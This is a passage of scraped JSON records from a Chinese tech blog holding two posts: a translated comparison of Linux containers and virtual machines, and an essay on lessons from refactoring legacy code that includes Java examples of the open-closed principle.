\r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113109\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113109votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113109\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"}
{"url_object_id": "acaa12f5ae1c32af3646d7eac821ccbc", "title": "Linux 容器 vs 虚拟机 —— 谁更胜一筹", "url": "http://blog.jobbole.com/113114/", "create_date": "2017/11/27", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/04/e260ae4f5d153b25be87819b25ff0577.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux,VM,容器", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.datamation.com/open-source/linux-containers-vs-virtual-machines.html\">datamation</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/news/90833/linux-containers-vs-virtual-machines\">开源中国社区</a>   </div><p>自从Linux上的容器变得流行以来，了解Linux容器和虚拟机之间的区别变得更加棘手。本文将向您提供详细信息，以了解Linux容器和虚拟机之间的差异。</p>\n<h3>Linux容器vs虚拟机 – 应用程序与操作系统</h3>\n<p>首先要了解的有关容器和虚拟机的一个事情是，一个运用于应用程序，另一个是为操作系统设计的。这就是为什么您经常会看到一些企业应用程序运行在容器上而不是自己的虚拟机上。在虚拟机上使用容器有一些优点。</p>\n<p>容器最大的优点之一是可以预留比虚拟机少的资源。请记住，容器本质上是单个应用程序，而虚拟机需要更多资源来运行整个操作系统。</p>\n<p>如果您需要运行MySQL，NGINX或其他服务，使用容器是非常有必要。但是，如果您需要在自己的服务器上运行完整的LAMP堆栈，则运行虚拟机更好。虚拟机有着更好的灵活性，可以供您选择您的操作系统，并在您认为合适的情况下进行升级。相比之下，运行已配置应用程序容器在主机的操作系统升级方面是隔离的。</p>\n<h3>Linux容器vs虚拟机 – 用例场景</h3>\n<p>我最喜欢使用容器的原因之一就是使用Linux库版本。例如，假设您需要Python的特定版本来开发应用程序。然后，当你在运行应用程序的盒子上更新时，突然发现Python版本发生了变化，导致应用程序无法正常工作。</p>\n<p>使用容器的另一个好处是你可以把一个应用程序放到一个容器中，然后在任何支持你正在运行的容器类型的操作系统上运行它。当你想要一个运行在不同Linux发行版应用程序时。通过使用容器，可以在各种不同的发行版上运行类似的应用程序环境。容器提供了可移植性。</p>\n<p>容器对于快速的跨发行版部署是更可行的，而虚拟机对于像运行LAMP堆栈这样的单一应用程序使用情况是更好的。</p>\n<h3>Linux容器vs虚拟机 – 安全性</h3>\n<p>与容器相比，虚拟机提供了更多的安全性。这并不是说容器不能被保护，而是说，默认的虚拟机提供了更大的隔离。请记住，容器可以共享系统资源而虚拟机不行。</p>\n<p>在运行容器时，可以采取一些措施来降低风险，包括避免超级用户权限，确保从可信来源获取容器，并且保持最新状态。有些容器是数字签名的，这有助于确定您可以从可信来源获取容器。</p>\n<p>最后，你需要保持容器的单一功能职责。一旦你开始在一个容器下结合软件职责，你会发现还是使用虚拟机最好。重申一下，容器是用于单一用途的应用程序，虚拟机用于多用途的应用程序。坚持这种做法，你将在安全性和整体功能方面处于更好的状况。</p>\n<h3>Linux容器vs虚拟机 – 选择合适的工具</h3>\n<p>无论虚拟机或容器类型如何，选择适合您需求的关键都在于研究每个选项的能力。在容器领域，Docker提供了强大的企业解决方案。这就吸引了那些关注Docker容器的公司，因为公司知道如果出现任何问题，他们可以得到他们所需要的支持。Docker是企业用户友好的选择，特别是在Docker Swarms中。而将Docker Swarms 与 Kubernetes 相比，Kubernetes在高级环境中的设置要复杂得多。</p>\n<p>回到虚拟机方面，我一直发现Virtualbox可以提供更好的面向桌面的虚拟机环境。而VMware在服务器方面做了各种各样的产品，VMware拥有从存储到云服务器解决方案的各种虚拟机解决方案，还有其他选择（各种管理程序等）。但我认为VirtualBox和VMware很好地代表了桌面到服务器虚拟化的两个领域。</p>\n<h3>Linux容器vs虚拟机 – 赢家是？</h3>\n<p>在决定容器还是虚拟机之前，请考虑以下事项。如果你选择容器，但你完全可以在虚拟机上运行容器。了解这一点很重要，因为这里没有明显的赢家或输家。事实上，这两种技术的需求完全不同。</p>\n<p>容器将引起媒体的持续关注，因为它们让用户用更少的硬件更高效地运行。在另一方面，虚拟机仍然是服务器和云空间的主要内容。</p>\n<p>我认为值得一看的是Kubernetes和Docker Swar之间的事情。我认为看看这两种容器管理技术是如何发挥作用的，以及哪种技术会成为标准。有一段时间，感觉好像是Docker。然而现在，Kubernetes占据了更多的营地。可能随着时间的推移，我们将开始看到Kubernetes成为头条新闻，并成为容器阵营的头号人物。</p>\n<p>你相信容器正在超越虚拟机吗？也许相反，你认为未来这两种技术将会结合？无论如何，请点击评论，让我们听听您的观点。无论如何，不管你是运行一个复杂的容器，还是运用虚拟机，我都想听听你对他们的看法。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113114\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113114votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113114\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/6085acc0af4696f5d49164561c6bc4f9b590fc26.jpg"}
{"url_object_id": "85a1563f08476f99dd846fd88f85ca11", "title": "浅谈重构中踩过的坑", "url": "http://blog.jobbole.com/113355/", "create_date": "2017/12/20", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/93e463354f2ead2ca7ccb6a636eec994.png"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 3, "tags": "IT技术,重构", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/chanshuyi/p/7832360.html\">陈树义</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/93e463354f2ead2ca7ccb6a636eec994.png\"></p>\n<p>最近重构了公司一个将近10年的核心功能模块，踩了不少坑。在做这个重构的时候好几次都觉得做不下去，好几次压力都非常大，心想着我该不会做着做着就退出编程届了吧。</p>\n<p>不过还好，自己还是坚持下来了，回想写这个项目的时候自己曾三次推翻重来，那种心路历程真的只有经历了才知道，真是煎熬。后来回想起这一路踩过的坑，其实更多的是经验问题，而不是技术方面的问题。</p>\n<h2 id=\"关于心态\">关于心态</h2>\n<p>回顾做这个项目，我觉得心态问题是最重要的，技术问题倒是其次。为什么这么说呢？因为对于10余年的老功能模块来说，其中最复杂的其实是业务逻辑，而并非技术实现。所以对于老系统的重构，你首先需要将这十余年来积淀在该模块的业务逻辑梳理清楚，这本身就给了重构者一个无形的压力。再加上又是核心业务模块，少一点业务逻辑就会导致线上收入的减少，最后就是程序员祭天的悲惨命运。这一系列的背景，使得重构之时心理压力真的很大。</p>\n<p>现在回头来看，对于重构项目，最好的方式还是先仔仔细细梳理清楚所有的业务逻辑，之后将其用<strong>思维导图</strong>画出来，这样你会对这十几年来的业务逻辑一清二楚。清楚了业务逻辑，对于你后面进行系统重新设计以及编码都是大有裨益的，甚至是起决定性作用的一环。</p>\n<p>说到心态这个话题，无论是做什么项目，即使是重构，也会涉及到排期问题。有时候很可能你自己还没完全了解业务逻辑之时，上级就要你给出一个排期，这时候其实作为重构者是很为难的。对于这种情况，其实我建议还是与上级做好充分的沟通，如果能延长给排期的时间是最好的。如果不能，那应该主动上报每天的进度，让上级知道你的进展。其实要你给出排期，不就是为了掌控进度吗。</p>\n<p>当你给出排期后，很可能会出现了许多当时预估排期时没有出现的情况，这时候一般我们有两种选择：一种是急急忙忙草草处理了事，另一种则是稳定心态思考最好的解决方式。其实当你发觉另一种做法是更好的处理方式，但这种方式在目前排期下无法完成，这时候作为整体功能的开发重构人，你应该有自己的判断。即使是因为做了这件事情而延期，但只要你做的这件事情是对的，有利于系统拓展性和稳定性的，那还是应该坚持自己的选择。<strong>我想，如果你因为正确的坚持而延期，我想公司并不会因此而责怪，只要你给出了自己的理由。最怕的是惊慌失措地写完一个东西，而这东西又漏洞百出。</strong></p>\n<p>所以有时候觉得开发或重构一个系统真的是得抱着必死的决心，这样才能有自己的坚持，而不会在上级的排期压力之下做出错误的选择。特别对于重构类的项目，如果没有一个从容的心态，那系统是肯定做不好的。</p>\n<h2 id=\"关于技巧\">关于技巧</h2>\n<p>我觉得重构中的经验技巧远重要于技术实力，因为一个经验可以让你减少很多不必要的麻烦。在说出我的心得之前，我想问一个问题：</p>\n<p>在你重构的时候遇到一个问题，这个问题解决了会更好，但不解决也不会影响到此次项目的结果。请问，此时你是解决这个问题，还是不解决好？</p>\n<p>有些人会分析：这要看情况，如果我有时间我会去解决，如果没有时间，那我就会跳过它。一般会给出这种答案的人，都是理论上的巨人，行动上的矮子，基本可以断定没有经历过实战。因为其分析很符合马克思主义的辩证主义思想啊，这也确实没错。但这样的解决方式对于实际情况是不够有用的。</p>\n<p>对于这种情况，我建议是不做。准确地说：<strong>对于任何不影响你达成重构目标的事情，能不做就不做。因为你永远不知道这个坑到底有多深！</strong>在你并不知道坑有多深，而此时又有排期（追兵）在后面，这时候最聪明的做法就是不做。等你把必须做的做完了，你再回头来看看这个问题，如果你可以解决，那就尝试着解决。但如果此时你发现坑真的很深，你可以果断返回，这时你其实已经做完了事情，并不会有排期的压力了。这样的做法给自己留足了后路，自己可进可退，可攻可守。但如果你一开始就选择踩这个坑，那么可能你会让自己陷入泥潭。</p>\n<p><strong>所以建议大家在不清楚的情况下不做，不是叫大家做事懒惰。而是让大家明白自己的目的是什么，在资源（时间）有限的情况下把事情做成。</strong></p>\n<h2 id=\"关于技术\">关于技术</h2>\n<p>技术是放最后的，因为我确实觉得技术在重构中并不是特别重要。至少在我这次重构中，我基本上60%的工作都是因为我的心态或技巧不足导致的重复劳动。我项目中重构涉及到的技术，我只用了不到10%的时间就完成了。回头想一想，真是觉得好凄凉。</p>\n<p>重构中的技术其实更多的是使用设计模式将复杂的业务逻辑用简洁的代码呈现出来。<strong>简单点来说，就是用设计模式承载复杂的业务逻辑，尽可能使写出的代码简洁。</strong></p>\n<p>怎么样才是一个好的系统重构呢？其实有一句话说得特别好：<strong>对拓展开放，对修改封闭。</strong>意思就是说别人只能拓展你的代码，而不能修改你的代码。很多老系统为什么会越来越复杂？逻辑越来越多？原因就是他写的代码允许别人进行修改。这么说可能会很抽象，我们举个例子说吧。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc8be0e8511145571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif(type == apple){\r\n    //deal with apple \r\n} else if (type == banana){\r\n    //deal with banana\r\n} else if (type == ......){\r\n    //......\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0e8511145571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0e8511145571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0e8511145571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0e8511145571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0e8511145571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0e8511145571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0e8511145571-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc8be0e8511145571-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">apple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0e8511145571-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//deal with apple </span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0e8511145571-3\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">banana</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0e8511145571-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//deal with banana</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0e8511145571-5\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0e8511145571-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//......</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0e8511145571-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>上面这段代码模拟的是对于水果剥皮的处理程序。如果是苹果，那么是一种拨皮方法；如果是香蕉，则是另一种剥皮方法。如果以后还需要处理其他水果，那么就会在后面加上很多 if else 语句，最终会让整个方法变得又臭又长。如果恰好这个水果中的不同品种有不同的剥皮方法，那么这里面又会有很多层嵌套。</p>\n<p>可以看得出来，上面这样的代码并没有满足「对拓展开放，对修改封闭」的原则。每次需要新增一种水果，都可以直接在原来的代码上进行修改。久而久之，整个代码块就会变得又臭又长。</p>\n<p>如果我们对剥水果皮这件事情做一个抽象，剥苹果皮是一个具体的实现，剥香蕉皮是一个具体的实现，那么写出的代码会是这样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc8be0f6353697782\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic interface PeelOff {\r\n    void peelOff();\r\n}\r\n\r\npublic class ApplePeelOff implement PeelOff{\r\n    void peelOff(){\r\n        //deal with apple\r\n    }\r\n}\r\n\r\npublic class BananaPeelOff implement PeelOff{\r\n    void peelOff(){\r\n        //deal with banan\r\n    }\r\n}\r\n\r\npublic class PeelOffFactory{\r\n    private Map&lt;String, PeelOff&gt; map = new HashMap();\r\n\r\n    private init(){\r\n        //init all the Class that implements PeelOff interface \r\n      }\r\n}\r\n\r\n.....\r\n\r\npublic static void main(){\r\n    String type = \"apple\";\r\n    PeelOff peelOff = PeelOffFactory.getPeelOff(type);  //get ApplePeelOff Class Instance.\r\n    peelOff.pealOff();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8be0f6353697782-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc8be0f6353697782-31\">31</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PeelOff</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">peelOff</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-3\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-5\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ApplePeelOff</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">implement</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PeelOff</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">peelOff</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//deal with apple</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-11\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BananaPeelOff</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">implement</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PeelOff</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">peelOff</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//deal with banan</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-15\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-17\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PeelOffFactory</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Map</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PeelOff</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">map</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HashMap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//init all the Class that implements PeelOff interface 